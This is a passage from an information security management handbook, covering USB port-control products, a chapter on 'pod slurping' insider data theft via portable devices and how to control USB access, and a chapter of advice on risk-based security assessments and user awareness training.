copied from a storage device on a per-user 
basis
Other technology solutions to assist include the use of software tools to limit 
port level access of these devices:
As a start, personal firewalls can be used to limit what can be done on 
◾
◾
USB ports.
Other products are able to provide more granular control around USB 
◾
◾
ports selectively.
HIDS can be used to generate alerts when portable devices connect to a 
◾◾
system.
11.6  Products
Lumension
www.lumension.com/usb_security.jsp
DriveLock
www.drivelock.com/Product.aspx
DeviceLock
www.devicelock.com/dl/
Safend
www.safend.com/441-en/Safend.aspx
SafeBoot
www.safeboot.com/products/portcontrol
PC Guardian
www.pcguardian.com/products/data.html
DeviceWall
www.centennial-software.com/products/devicewall
McAfee
www.mcafee.com/us/enterprise/products/data_loss_
prevention/device_control.html

145
12
Chapter 
The USB (Universal 
Security Burden) 
Nightmare: Pod Slurping 
and Other High Storage 
Capacity Portable 
Device Vulnerabilities
Kenneth F. Belva
John walks into the office and smiles “hello” to his boss, the Northeast regional 
sales manager to whom he reports, while grooving to the latest hit single on iTunes. 
There’s been some tension between John and his manager, but today John feels 
particularly elated. He walks to his cube, hangs his jacket on the knob, plugs his 
iPod into the USB port on his company workstation, greets his fellow co-workers, 
and heads to the coffee machine for a fresh cup. It’ll be John’s last brew because he 
finalized the contracts to work for a competitor who will pay him a handsome sal-
ary for his insider perspective. John walks back to his desk, looks at his iPod, and 
grins. He thinks to himself, “that was so easy!”

146  ◾  Information Security Management Handbook
Three minutes and fifteen seconds: that’s all it took for John to copy all of the 
data files from his workstation onto his iPod in an automated fashion.* Pod slurp-
ing is the name of this attack and it’s fairly easy to execute. At home, the end user 
loads slurp.exe onto the iPod device file system. To slurp a workstation, an iPod 
is connected to a workstation via USB and then the end user executes slurp.exe 
through the iPod interface. The executable automatically copies all data files from 
the workstation onto the iPod device. It’s that simple.
The root of the issue is not the iPod, but the security over the USB port. Portable 
USB devices with high storage capacity—of which an iPod is one—are ubiquitous. 
Devices with USB interfaces are either inexpensive (such as high capacity USB flash 
drives) or an integral part of the design of devices (such as cameras, cell phones, 
MP3 players, etc.). The drivers for most USB devices are either universal in nature 
or preinstalled on the operating systems: it is most likely the case that installation 
of device drivers are not necessary by the end user. In short, this means most USB 
devices are plug and play. If the controls over the USB port are not properly set, 
nonauthorized devices such as iPods, cameras, and cell phones may connect to the 
workstation or server.
Pod slurping is unique in terms of a USB storage device attack: the iPod will 
pull the data from the workstation onto itself. In most circumstances, the work-
station pushes the data to the device at the request of the end user (dragging and 
dropping, etc.). While most USB attacks are straightforward, some have a high 
degree of technical sophistication. Some USB devices may be flashed to include 
malicious code. When the OS attempts to read the USB device for communication, 
the attack occurs at the driver level.
The attacker will need a physical connection to the workstation or server, which 
tends to make these attacks occur from an organizational insider. In most environ-
ments, physical security restrictions aimed at preventing USB-enabled devices from 
entering an organization’s premises are either unlikely to be enforced properly or 
too burdensome and counter to an organization’s culture. In addition, prevent-
ing employees from carrying portable devices into the workplace is usually not 
enforceable due to the volume of people and devices. Some colleagues tell me that 
certain data centers have lockers for their employees. When the employees comes 
to work, they are required to put all electronic devices—MP3 players, cell phones, 
etc.—in their locker. Bringing a portable electronic device beyond the locker room 
is grounds for dismissal. The locker room approach is neither feasible nor suitable 
for most environments.
Various solutions have been proposed: physically gluing the USB ports closed 
with crazy glue, physically inserting a USB lock into the USB port, as well as con-
trolling access to USB ports via Microsoft/s Group Policy. Although a handful of 
third-party products exist to control this type of device access, Microsoft’s Group 
Policy may help, depending on the infrastructure. At the time of this writing most 
*	http://www.sharp-ideas.net/pod_slurping.php.

The USB Nightmare  ◾  147
USB GPO implementations give the security professional a binary option: either 
one permits USB use or one does not permit it.* Microsoft’s newer GPO permits 
access or denial by device, not just USB driver.†
When the proper granularity of control is implemented, USB port control 
becomes a matter of policy: who gets to access USB ports and for which devices. 
Due to the ubiquity of USB mass storage devices, whitelisting specific devices in 
combination with limiting such device access to a certain class (or group) of users 
is highly suggested.
Since 2005, the number of reported security breaches has skyrocketed due to 
various state laws requiring organizations to disclose when personal, nonpublic 
information has been mishandled. While sifting through various breach reports 
and searching a breach report database, I have not discovered any reported breaches 
due to iPod slurping or USB portable devices.‡ Most breaches are due to equipment 
theft—stolen laptops and such—not USB attacks.
Why might this be? Because monitoring and reporting over USB ports is not 
common, it is very difficult to detect when data is stolen in this manner. If data was 
stolen in this manner, one would most likely find out after the damage is done, if 
at all. Also, it seems to me that there is another reason USB security incidents are 
not reported. Data stolen by USB will most likely be used for personal advantage or 
corporate espionage, not sold out on the open market.
If current trends continue, devices with larger and larger capacity will be less 
and less expensive. This means the USB threat increases, because the volume of 
data able to be copied onto a portable device increases with the storage trend. 
In the previous paragraphs, I emphasized employees attacking workstations with 
USB devices. Server data is more likely to be compromised as the storage of the 
device grows.
In the final analysis, controlling USB devices is a policy decision that must 
be made in light of the state of the controls capable of being implemented over 
USB ports. The USB security trade-offs will have increasing significance as storage 
becomes cheaper and devices become smaller. The ease of moving the data onto 
these devices will continue to become less cumbersome as the automated process of 
slurping data increases to other device types.
*	Microsoft Knowledge Base, HOW TO: Use Group Policy to Disable USB, CD-ROM, Floppy 
Disk, and LS-120 drivers http://support.microsoft.com/kb/555324.
†	 Managing Hardware Restrictions via Group Policy, TechNet Magazine, http://technet.micro-
soft.com/en-us/magazine/cc138012.aspx.
‡	 http://attrition.org/dataloss/.


149
13
Chapter 
Diary of a Security 
Assessment: “Put That in 
Your Pipe and Smoke It!”
Ken M. Shaurette
13.1  Introduction
“Put that in your pipe and smoke it!”? Well, a personal friend and fellow security 
professional, Tom Schleppenbach, once said to me: “I bet you can’t write a chapter 
that uses that saying.” The saying doesn’t necessarily have anything to do with the 
content of this chapter, but it did get you this far. Did you notice the less entertain-
ing titles in the book? To find out more you’ll have to continue with me through the 
rest of this chapter as I try to bring entertaining value to the information security 
domains. So, fill your pipe and come along as we assess security; past, present, and 
when the tobacco runs out.
As we continue to learn more about the discipline of information security—
or should we call it “securing information”?—I’ll be interjecting a few quotes and 
Contents
13.1	 Introduction..............................................................................................149
13.2	 Filling the Pipe with New Smoke: Why Security?..................................... 151
13.3	 Managing Risk in Today’s World of Rapidly Changing Threats................154
13.4	 Sample Steps in a Typical Assessment.......................................................158
13.5	 Learning How to Enjoy the Pipe: Effective Security Awareness.................160

150  ◾  Information Security Management Handbook
include a few well-placed jokes. Humor me, I’m a Certified Information Security 
Professional®, and we are all a bit funny, aren’t we? If you don’t believe me, tell man-
agement you need another 50 percent increase in your security budget to keep their 
butts out of jail and see how much laughter you generate. Tell them you are going to 
remove all the firewalls they just bought because the organization no longer has any 
defined borders and the protections on data will still be as good or better than ever.
Although inadequate security is definitely no laughing matter, there have been a 
significant number of amusing incidents over the years. Many of these can bring a 
smile to the face of even the most serious security professional who believes in using 
the FUD factor (fear, uncertainty, and doubt) when trying to get management’s 
attention. Remember the days of simple executable attachments, i.e., .bat, .exe? An 
FBI friend of mine once commented in a presentation that viruses wouldn’t have 
much chance to spread if it were not for male stupidity. Do you recall some of their 
names: annakournikova.bat, nakedwife.exe, or loveletter.bat. Come on guys, when 
was the last time you got a love letter or naked pictures of your wife, and when 
did you get a business attachment named after a female tennis player? They were 
known to spread, and I’m not sure I remember naming any of my business files 
like that? What were they thinking? I don’t think Anna Kournikova was the name 
of the new claim file or spreadsheet. It was all about security awareness, simple 
yet forgotten. The common comment by system administrators and security staff 
back then was that users weren’t smart enough to bother educating them about the 
risks and potential issues associated with opening attachments. Their argument was 
“we need technology that can recognize the virus and prevent it from spreading.” 
Technology must protect the user from the user. Back then administrators were still 
wishing technology could identify (even by signature) and block e-mails containing 
suspicious attachments.
It is a good thing that as time has passed security awareness has become a more 
important part of all security programs. The security program has finally begun to 
educate users, and users have become more and more computer literate. Technology 
as well has become more robust, but our users still remain the potentially weakest 
link. Building a robust and holistic security program supported by an operational 
plan to implement all of the components remains as critical as ever. We will talk 
more about security awareness when we learn how to light our pipe at the end of 
this chapter.
What else has changed from those early days of counting on “stupidity” to 
propogate malicious code. Attacks have become more complex using multiple tech-
niques or are made up of a blend of different types of attacks. This has become very 
common practice. E-mail is the most common delivery mechanism, and the attack 
no longer needs simply to be an attachment. The motive and intent by attackers 
has changed. In the past, even the names of the malicious code (i.e., nakedwife, 
annakournikova, loveletter) signified a more playful, less financially motivated 
attacker. Now the attack is moving away from simple notoriety to financial gain. 
The target has become the theft of financial or personally identifiable information 

Diary of a Security Assessment  ◾  151
(PII) or nonpublic information (NPI). Traditional security measures are not going 
to remain enough. Organizations will need to become more diligent and more 
creative, perform regular audits/assessments, and more importantly make security 
part of their DNA.
The other portion of this chapter’s title is also going to mislead you: “Diary 
of a security assessment.” It is meant to discuss security as an overall discipline, 
assessing security, not necessarily teaching you, the reader, how best to perform a 
“security assessment,” as recommended by bank examiners, consultants, and nearly 
every security professional. Yes, it will provide valuable information on this activity 
that is highly recommended when undertaking this effort and some opinions on 
the security assessment process overall.
Notice that I did not limit my description in the title by describing this as 
an “information security assessment.” There are many aspects today that are an 
important part of information protection such as facility controls (heat, air condi-
tioning, power), business continuity (disaster preparation, incident management, 
business impact analysis), which at one time were not directly considered part of 
information security. We still often see titles such as CSO (chief security officer) 
versus CISO (chief information security officer), but no one can really believe that 
one can function exclusive of the other. Today’s protection of information can’t be 
so limited as to think only in the terms of information and technology as was once 
the case. You no longer just lock the doors to the computer room and make sure 
the dumb green or amber screen terminals are powered off at night. The boundaries 
protecting information have blurred over time and are no longer easily defined. In 
fact, some organizations are moving to “security without borders.”
An organization today must face the challenge of exchanging large volumes of 
sensitive information, while ensuring the highest level of data privacy and protec-
tion. The network is no longer tightly contained within the borders (i.e., wires) 
directly controlled by the organization. The organization must find a means to 
exchange information confidently and securely with customers, suppliers, and ser-
vice providers while avoiding high implementation costs, roadblocks to deploy-
ment, and lack of data portability. What likely will make this possible is the third 
generation of gateway security appliances. They provide a significant change in 
how organizations protect their data. The leading vendors have coined this new 
technology “unified threat management,” or UTM. The old faithful solutions will 
have a very difficult time catching up because their technology was not built to do 
content inspection. Without change, their firewall products will soon be as obsolete 
as analog televisions.
13.2  Filling the Pipe with New Smoke: Why Security?
Since the year 2000, organizations have faced increased challenges related to 
information security. In 2001, the world experienced the horrendous events of 

152  ◾  Information Security Management Handbook
September 11, which has since resulted in federal legislation.* Other data breaches, 
poor accounting practices/controls, and other events caused by an overall failure on 
the part of organizations to take security seriously enough have resulted in other 
forms of legislation.† Many areas of information security have remained somewhat 
constant; however, some areas have seen drastic change. Consumers, especially, 
have become much more educated about the need to protect the information they 
share with organizations. The security solutions have seen numerous changes in 
how organizations protect their data or digital assets.
In an initial conversation with an organization, it is necessary to look for answers 
to two main questions: (1) What are your top three business objectives or goals? 
and (2) What are your top three information technology goals or strategies? The 
answers often vary, but within the last several years information security is usually 
identified within the top three strategies in nearly every organization.
One of the main challenges faced by nearly every organization is how to frame 
information security in a manner that best suits the business of the company. 
Framing information security can be a challenge for any organization even if it has 
the expertise and budget. With all that has been published in recent years about the 
security subject, it still can be very confusing. Often the most confusing thing is 
deciding on which security philosophy based on some method, standard, or guide-
line a company should choose.
Numerous articles, white papers, chapters, and books are dedicated to this very 
topic from NIST special publications and specific compliance requirements such 
as the PCI-DSS 12-step program‡ to an enterprise security philosophy structured 
on the five basic steps of assessment, prevention, detection, response, and vigilance. 
These are not to be confused with the four steps of the security life cycle (assess, 
remediate, penetrate, and repeat). They are also different, but provide similar 
requirements when using the three Ms: manage, monitor, and measure. And don’t 
forget the five Cs: compartmentalized, consistent, centralized, comprehensive, and 
coherent. Each of these is a different way to view information security and is made 
up to help remind people of the important aspects of a security program.
Hmmm, maybe for fun we should just make up a few of our own versions of 
security acronyms specific to different industries:
Energy industry
VOLTS: Vigilance, operational controls, legislation, 
technology, security strategy
Financial industry
VAULTS: Vigilance, assessment, user education, 
legislation, technology, security strategy
*	U.S. Patriot Act (Public Law 17-56), October 2001.
†	 HIPAA, SOX, GLBA, FERPA, FISMA, and others.
‡	 PCI/DSS is specific to the storage, transmission, or processing of a credit card holder’s primary 
account number (PAN). See www.pcisecuritystandards.org. 

Diary of a Security Assessment  ◾  153
Government
POLITICS: Prevention, operational controls, 
legislation, integrity, technology, integration, 
compliance, security strategy
Manufacturing industry
PACKERS (I live in Wisconsin, so this has to be the 
best security acronym possible!): Prevention, 
assessment, compliance, knowledge management, 
environmental controls, risk management, security 
strategy
Medical industry
MEDS: Management, education, defense in depth, 
security strategy
Notice a consistent theme used in each acronym: they all end with strategy.
Oh, while we are talking about the reasons for security, let’s not forget (as if a 
security professional could, even if wanting to) each of the legal regulations (e.g., 
FERPA, GLBA, HIPAA, SOX, etc.) and, it seems in recent years, the growing 
number of guidelines or standards to reach compliance, perform risk assessments, 
or configure security.* Often auditors or security professionals and sometimes 
management have their personal favorite to use when implementing a security pro-
gram, managing risk, or configuring security for their organization. As a general 
rule, I find from experience that although each of the standards/guidelines is a little 
different, the base concept from a security perspective is that they are all alike. 
This is also true for each of the major regulations. While unique to an industry 
(e.g., HIPAA [health care], GLBA [banking], FERPA [education]) or specific to an 
organization’s operational area (e.g., SOX [finance]) or specific functionality (e.g., 
for forensics and retention of electronic information for discovery in a legal case, 
“Uniform Rules Relating to the Discovery of Electronically Stored Information” 
aka eDiscovery; and California’s SB1386, one of the earliest pieces of legislation 
to require reporting of data breaches and impact incident management signifi-
cantly), each looks to protect the confidentiality, integrity, and availability (CIA) 
of data. Each piece of legislation has some similarity to the others in that their end 
goal is to ensure the CIA or utilization of information. How often have we heard 
management simply ask: “What do we need just to be compliant? We don’t want 
to do more. We just need to be compliant; anything more would be a waste of 
money.” Security teams must simply answer the question: How much security is 
enough? With the right answer to that question I wouldn’t need a day job; I’d be 
a gazillionaire.
*	For example, CoBiT (www.isaca.org), COSO (www.coso.org), ISO17799–ISO27001:2005 
(www.iso.org), NIST (www.nist.gov, csrc.nist.gov), NSA (www.nsa.gov/snac), Octave (www.
cert.org/octave), IT governance (www.itgi.org), ITSG Threat and Risk Assessment Guide 
(www.cse-cst.gc.ca/publications/gov-pubs/itsg/itsg04-e.html etc.).

154  ◾  Information Security Management Handbook
To illustrate that security is catching on with management, the 2007 National 
Association of Corporate Directors survey report revealed that in the past six years, 
more and more boards became actively engaged in the oversight of information 
security. It is no surprise to any security professional that even though this has 
become more popular, both the board and management need to do a better job of 
communicating, and in 2008 information security roles and responsibilities still 
need to be better defined. This definition should be incorporated into corporate 
security policy and the security program.
13.3  Managing Risk in Today’s World of 
Rapidly Changing Threats
Remember the history of computing? It can be defined in terms of increasing con-
nectivity over time. It started back in the days of no connectivity. You either sat at a 
mainframe terminal to access the data or you didn’t access it. Computing then saw 
restricted connectivity, which is essentially where we currently are today. The future 
network could result in connectivity where there remain a few islands split off from 
everyone else, but overall corporate connectivity means data is protected by design 
during the business life cycle. Access is granted to the authorized entity regardless 
of location based on their need, and it is not possible to identify the boundaries of 
an organization easily. Is the network boundary your partner’s network or your 
partner’s customer’s or their partner’s network? Today many organizations are only 
as secure as the least secure entity that they have connected to, that is assuming 
they have already eliminated all vulnerabilities, minimized risk, and reduced all 
threats in their internal organization. They have implemented foolproof controls 
that are close to the data that needs to be protected. Remember, a fool is someone 
who has not learned from his mistakes or the mistakes of others.
To describe this concept briefly, there are key indicators that would lead pre-
dictions of what organizations without perimeters are in the near future. These 
include a mismatch of the (legal) business border, the physical border, and network 
perimeter. Businesses are demanding more direct connection to partners’ systems 
where business-to-business relationships exist and impact the quality of network 
connectivity and access for all business and operational relationships. Applications 
are distributed or shared between business and operational relationships. These 
applications often require that they bypass perimeter security, i.e., today’s firewall.
“Borderless information security.” The Internet has already connected anyone 
to anywhere at any time, and business has to be concerned with a global economy. 
Someday you won’t have a firewall pretending to protect your organization and cre-
ating the false security that your organization is safe. As noted earlier, the protections 
will become part of an organization’s DNA. Controls will be ingrained in the way 
everything is constructed during the development, acquisition, and implementation 

Diary of a Security Assessment  ◾  155
life cycle, not added on at the end. Security must be included as a feature in every 
new information technology product or service introduced into the organization.
We know that every security program must have a strategy that integrates 
both business and technology. Just like elimination of the security perimeter, the 
integration between the business and security needs to be seamless and without 
a rigid boundary. Too often it is easy for an organization to get caught up in one 
philosophy over another. Too often organizations spend too much time trying to 
decide what methodology, guideline, or standard to follow rather than building 
security processes into the life cycle by simply letting good security practice, rea-
sonable controls, and adequate due diligence become a natural part of the organi-
zation. It is not unusual to find an organization that focuses too much in one area 
(e.g., technology) and not enough in another (e.g., people or process), or concen-
trates too much on application development (e.g., business) deadlines forgetting 
to implement controls during the development life cycle. It is important to build 
a holistic security program that does not put too much emphasis in any one area 
without regard to equally critical elements. Compliance–Security: not just a jour-
ney, it’s an adventure.
Over the past few years the concept of risk-based audits has become prevalent 
in the language used by bank examiners, compliance experts, and almost anyone 
associated with security and the process associated with defining a security pro-
gram wants to use risk in an attempt to justify our security programs. Although 
important, risk is quite difficult to measure accurately, especially as related to loss 
expectancy for many types of security events. The difficult aspect is predicting the 
actual loss expectancy for a security event in an accurate enough manner, which 
would adequately predict the potential of an event occurring that would have value 
to your risk assessment. For events other than the more physical aspects of security 
such as fire, hurricane, or other natural disasters, a history that actuaries can use to 
create an accurate table of loss expectancy for many common information security 
events does not exist. Can any security professional imagine the value of a table of 
annual loss occurrences? Because of this fact, security professionals must perform 
qualitative assessments instead of quantitative assessments. Insurance companies, 
banks, the FDIC, law enforcement ,and every risk manager in the world wants 
that data. The person or organization that comes up with it has just become a 
millionaire. There are things like the annual CSI/FBI survey and resulting report, 
but it is considered by many to be very, very flawed from a statistical point of 
view. Avoidance references to faulty security risk reduction statistics that cannot 
be proven. Management will not respect haphazard, incomplete, incorrect, and 
insupportable statistics.
For fire, hurricane, or other natural disaster type events predictive tables are 
created by insurance actuaries for use in setting insurance premiums. These are 
often used in disaster recovery planning for determining the potential frequency of 
specific events such as destruction by fire or likelihood that a flood, hurricane, or 
tornado may occur in a given location.

156  ◾  Information Security Management Handbook
Essentially, the situation remains the same at this time (Spring 2008). There 
are no solid statistics that can be collected to create a table of losses for each threat 
related to information security. Part of the challenge is that not all events may be 
getting reported yet, and there really is no central place for gathering the data.
For an example, MEHARI, the risk management methodology, proposes that 
risk assessment start with the evaluation of the potentiality of occurrence of events 
for a given organization by examining and reworking a “standard” probability table 
(with four levels) provided by the method. Notice, it refers to potentiality versus 
any statistical reality. This can be the first step toward coming up with an accept-
able quantification of occurrences.*
MEHARI provides four levels of possible occurrence rates using a list of approxi-
mately 50 events including such things as errors, accidents, and voluntary and mali-
cious acts. This concept has been named natural exposure and the level is decreased 
primarily by security measures set up by the organization. Levels may correspond 
to thresholds in a factor of roughly ten. Natural exposure to malevolence depends 
also from the “image” of the organization (leader or follower) internally and exter-
nally. It is clear that different organizations will have different security policies, 
different environments, different awareness levels, competitors, etc., so the actual 
rates should differ even in the same vicinity and activity.
This methodology emphasizes the importance of regularly re-examining poten-
tiality and impact as an environment can change drastically over time. Although 
the MEHARI methodology provides the “standard natural exposure table,” which 
is a way to evaluate risk, it is still not supported by any type of statistical probability 
of occurrence. To date, this is one of the few methodologies around that has created 
a table to evaluate probability.
Although MEHARI has established the exposure table, resources are being 
developed that are trying to close the gaps on the concept of statistical probability 
for occurrence of data loss. An example can be found at http://attrition.org/data-
loss/. Using this information, it could be possible to plot results over time.
In the September-October 2007 issue of EDPACS (the EDP Audit, Control, 
and Security newsletter), Donn B. Parker† (a recognized contrarian) brought out 
some important concepts about today’s security strategy of “risk assessments.” To 
quote from Donn’s article:
There is no return on investment (ROI) in security or ROSI, with one 
possible exception. Increased security may produce a savings (SOI), 
*	Additional information can be obtained from the Risk Analysis Guide on pages 9 and 16–17 
and Concepts and Mechanisms, pages 14–16, located at http://www.clusif.asso.fr/fr/produc-
tion/ouvrages/type.asp?id=METHODES. The methodology document is freely downloadable 
at http://www.clusif.asso.fr/en/clusif/present/.
†	 Donn Parker is a retired information security expert. He has specialized in information secu-
rity and computer crime for over 35 years. He has numerous writings based on interviews and 
reviews of computer criminals and large corporations.

Diary of a Security Assessment  ◾  157
not a profit, from a precluded or reduced loss. However, the savings is 
unknown because you do not know if it has occurred.
Donn has raised an interesting and accurate point of view. As Donn points out, 
“risk assessment” has only two limited purposes. The primary one is justifying the 
use of controls and practices determined to be useful. Risk does not aid in identi-
fying controls and practices. From my point of view, the important message that 
Donn brings forward is that a risk assessment will not aid in prioritizing security 
improvements, and it does not help provide emphasis in one area over another. 
Sure, it probably should, and is the right tool to provide for an emphasis on the 
controls that best mitigate an organization’s greatest risks or minimizes its biggest 
threats. In the end, how many find that management only wants to do just enough 
to be compliant? “Tell me exactly what I need to do for HIPAA compliance; we 
don’t need to do anything more than that; it would be overkill and not provide a 
return on the investment!”
Another point that Donn has been making for several years relates to expand-
ing on the base security paradigm or triad of CIA, which provides a very sound 
foundation for security and a pretty easy way to teach the base concepts of infor-
mation security requirements. The important message to consider is that there are 
more types of loss than just those associated with disclosure, destruction, use, and 
modification. Controls need to consider these along with including such things as 
“observation” (e.g., placement of workstations to avoid viewing by the public). The 
data does not have to be intercepted or hijacked electronically to impact its value.
Donn suggests remembering a couple of important elements to make a secu-
rity model more comprehensive. These include considering control/possession,* 
authenticity,† and utility.‡ It could be argued that these are separate from typical 
CIA, but also an argument could support including them in one of the areas of 
the more simplistic CIA triad. Depending on the situation or case, control/pos-
session potentially fitting into confidentiality and integrity, authenticity also hav-
ing characteristics fitting both, and utility probably best fitting under availability 
(encrypted data that can’t be unencrypted is unavailable even though it is techni-
cally still there).
Consider for a moment an industry trade secret. The company is due to release 
a new deep-dish pizza. With this release, the company will be a market leader, the 
first to offer this special and delicious pizza in grocery stores. This release will be 
*	Does the organization remain in possession and complete control of the resource? Piracy is suc-
cessful because of the duplication of software programs, and controls to prevent are difficult to 
enforce. You may know the keys needed to log in, but who else might possess those keys?
†	 Is it possible to guarantee the identity of people you communicate with, consider nonrepudia-
tion concepts.
‡	 An employee encrypts an entire hard drive and forgets the encryption key or leaves the com-
pany with the key. The data is technically still available, but without key escrow or a master key, 
or some method to decrypt the drive, the information is not accessible to the organization.

158  ◾  Information Security Management Handbook
revolutionizing the way people think of eating pizza. The company is at least a year 
ahead of the competition in coming up with this new product. About three months 
before product release, the information is inadvertently viewed by a tour group that 
is visiting the company’s pie-making plant. They see the information posted on a 
kiosk in the cafeteria. It is on the company’s intranet. Reason: because this release 
is an exciting opportunity that all employees need to get behind. The information 
was not transmitted, the storage was not corrupted, the data never left the organi-
zation, but it still leaked to the competition. The competition quickly put together 
a strategy for a similar pizza that tastes just like pizzeria pizza. Rather than having 
a one-year lead on the competition to corner the market, the competition was able 
to get to market within three months after the new product release and reduced 
potential market share by over 70 percent.
In this case, the actual data never left the company. It remained confidential, 
and was even treated as confidential. No one changed it, so the integrity was not 
impacted, and it remained available for anyone to use, but an event impacted the 
value of the information to the company.
13.4  Sample Steps in a Typical Assessment
NIST established a Risk Management Framework to support FISMA with easy to 
read and use supporting documents. Figure 13.1 shows a flow for risk management 
as well as the associated documents that NIST has created to help along the way.
We have discussed methodology (total risk management), discussed our past, 
and identified some reasons for security. We covered the belief that risk does not 
always drive the priority for controls. (We never do it just because management said 
to!) So what’s next? How do we prepare for an assessment? According to Dr. Ron 
Ross of NIST:
Risk management is not an exact science; rather, it brings together the 
best collective judgments of the individuals responsible for the strategic 
planning and day-to-day operations of the business enterprises to pro-
vide an appropriate level of security for the information systems sup-
porting the ongoing operations and assets of the enterprises.*
This is supported by Donn Parker when he identifies that “quality and success” 
are “strongly dependent on the quality and experience of the review team.” A quali-
fied and experienced security professional is likely to have the various methods and 
standards ingrained in their personal way of doing things. They won’t necessarily 
*	Ross, R. February 2007. Managing enterprise risk in today’s world of sophisticated threats: A 
framework for developing broad based, cost-effective information security programs, EDPACS, 
Vol. XXXV.

Diary of a Security Assessment  ◾  159
follow one methodology verbatim over another. They will simply perform a quality 
review of security controls. Methodology may be applied later or used as a reminder 
to avoid missing any activities.
The documentation that methodologies provide is helpful for filling in the 
blanks when going through the actual steps of reviewing security. IT auditors will 
follow a very similar structure; however, a main difference will be the need for proof 
and evidence. Auditors are from Missouri—the “Show Me” state. Management is 
from New Mexico—“The Land of Enchantment”; they believe it can all be secure 
without any budget. Security professionals—they don’t have any specific state, but 
they should be in a continued state of paranoia; just because they think the bad 
guys are chasing them, doesn’t mean they aren’t.
A few recommendations for any review/assessment of security:
Identify objective: How will this review be used and what will be done with 
◾
◾
the results? Don’t get caught up in methodology. First identify your purpose 
of finding all you can find.
Identify assets: Determine scope. Is everything to be included?
◾
◾
Identify stakeholders: Who will be involved and can provide answers or suf-
◾
◾
ficient information for an objective review?
Tools: Build a checklist, audit program, questionnaire, or whatever tool that 
◾
◾
works best for you based on agreed-on scope.
MONITOR
Security Control
CATEGORIZE
Information Systems
SELECT
Security Controls
Security Controls
Security Controls
Security Controls
Security Controls
AUTHORIZE
Information Systems
SUPPLEMENT
ASSESS
IMPLEMENT
DOCUMENT
Figure 13.1  The NIST Risk Management Framework.

160  ◾  Information Security Management Handbook
Gather data: Bring together all the information to analyze using the tools, 
◾
◾
interviews, and observations. Sometimes experience may tell you something 
about the data, lack of controls, vulnerabilities, and risk that is not otherwise 
obvious by simple existence of the data.
Analyze the data: Form opinions; where possible let the data speak for itself, 
◾
◾
but when unsure confirm with a stakeholder or gather more data to support 
the analysis.
Report: Establish a report that provides “findings” supported by the data and 
◾
◾
agreed to exist by stakeholders. Generally, if there is data to support the find-
ing, the stakeholder must support the finding, but may not support the prior-
ity. This may be negotiable and should be based on the importance/criticality 
of the systems* that might be impacted.
Present to management: This step can often be an iterative process by 
◾
◾
which a negotiation must take place. The negotiation can’t eliminate a 
finding, but with a reasonableness check, priorities of controls should 
become established.
Monitor: The latest buzz is continuous auditing (monitoring). Why not con-
◾
◾
tinuous security? Keep the adventure fresh.
With all the methodologies, standards, and guidelines, it is not hard to find 
information and opinion written in significant detail about nearly every one of 
the ways to assess security. None of them is necessarily wrong and none of them is 
necessarily right. After a company identifies its real objective, it can determine if it 
has the budget and resource commitment to really make it happen.
Objectives can be as simple (and general) as proving that management needs 
to continue funding the security department, to something more complex (and 
specific) as identifying the technology (IDS/IPS, anti-SPAM, anti-virus) and archi-
tecture (subnets) that will be funded to provide improved control over the data in 
the organization.
13.5  Learning How to Enjoy the Pipe: 
Effective Security Awareness
A lot of time has passed since the days when simple virus protection mechanisms 
consisted of blocking attachments containing extensions that were considered high 
risk. Solutions are now available that go beyond simple signatures and look at heu-
ristics and anomalies to try identifying the potential performance characteristics 
of an attachment or e-mail before it has even been reported in the wild. Security 
*	For simplicity, systems here may refer to networks, applications, operating systems, databases, 
processes, people, and any business resource.

Diary of a Security Assessment  ◾  161
professionals have increased security awareness beyond the simple once-a-year 
e-mail or optional workshop to educate end users. Our end users are much more 
security literate and have become the human firewall that protects our systems 
almost as well as the technologies. Back in 2001, a project was even created, sup-
ported by a “Human Firewall Council,” and formed with the intent to help security 
directors define policies. According to surveys back then, far too many organiza-
tions were neither training their employees to prevent breaches nor investing stra-
tegically in security.
In a study published in February 2008, the council analyzed responses from 
more than 1000 organizations and found that eight of ten survey respondents had 
not implemented even minimal security management practices. Industries such as 
financial services, health care, and even government agencies where security prac-
tices are federally mandated, reported that little more than half of the surveyed 
organizations had defined security management practices.
In a few short years, we have seen significant improvements and more activ-
ity on the security awareness front, but there is still a long way for this area to 
go. Most banks, at minimum, have annual security awareness training addressing 
bank procedures such as how to react in a robbery, but many still lack sufficient 
training components about information security, including things like reporting 
of incidents. Often this is directly associated with the lack of a formal incident 
management plan.
Security programs have begun to recognize that the end user can be a valuable 
solution to protect against more than just the spread of a virus. Educating the end 
user properly in many cases is the only way to protect against many of the incidents 
that have resulted in major breaches. For several years, my personal recommenda-
tion has been to teach users how to handle data using what I’ve come to call Ken’s 
Golden Rule: “Treat all data you work with like it is data about yourself or one of 
your family members.” When users take the attitude that the data they work with is 
personal, they will certainly be likelier to be more aware and use security measures 
and the common-sense mechanisms that will better protect the data.
When an organization begins security awareness, a number-one recommenda-
tion would be as follows:
The first week of training, provide employees with information about how 
◾
◾
they can protect their own identities and secure their own information. Give 
them information that can help them protect their own personal informa-
tion, their own Internet banking, credit card information, and other account 
numbers. Use references to new technology and practices in security motiva-
tion and awareness messages to increase the audience’s interest in security. 
Use Websites like those provided by the Federal Trade Commission (www.
ftc.gov). As of 2008, this site included links to resources for preventing iden-
tity theft, an information security video tutorial, and even the “Do Not Call 
Registry.”

162  ◾  Information Security Management Handbook
In a subsequent week of training, shift gears and provide your employees 
◾
◾
with information about the controls and security precautions that have 
been implemented at your organization. Give them information on where 
to find the company information security policy. Show them and explain 
end-user computing rules. This is a great training opportunity to help them 
understand that your company takes the protection of customer information 
very seriously and has implemented important control measures that, when 
properly followed, mitigate the risk to customer data. It may be surprising to 
employees just how much these controls sound familiar to the measures that 
were taught the previous week in protecting their own data. Employees will 
have a much more personal connection to the controls that they once thought 
were only in place to prevent them from getting their jobs done. They will 
realize just how important these controls are in protecting customer data. 
They will become much more inclined to treat data they work with like it is 
data about themselves and comply with policy.
As the importance of securing information and the discipline we call informa-
tion security is taught to our youth by elementary school teachers, even as early as 
kindergarten, our children will learn to protect themselves by the actions they take 
when using computers and the Internet. They will learn to build security into their 
daily lives. It will become as natural to them as eating or breathing. Security will 
no longer consist of new controls, technology, or architecture that gets added into 
a process or onto a database, network, or system to make it more secure. We will 
no longer need to build secure networks or implement security solutions. By the 
nature of how we architect and construct the network from the inception of a busi-
ness process, from the point we decide how our mail systems function, to how the 
operating system is delivered, and how all users use technology, they will be secure. 
Consumers today are beginning to expect businesses to provide security and are no 
longer assuming that they are doing so. All systems will one day come out of the 
box secure, all networks protected, all consumers (users) aware.
Humor me; I have a dream.

163
14
Chapter 
NERC Compliance: 
A Compliance Review
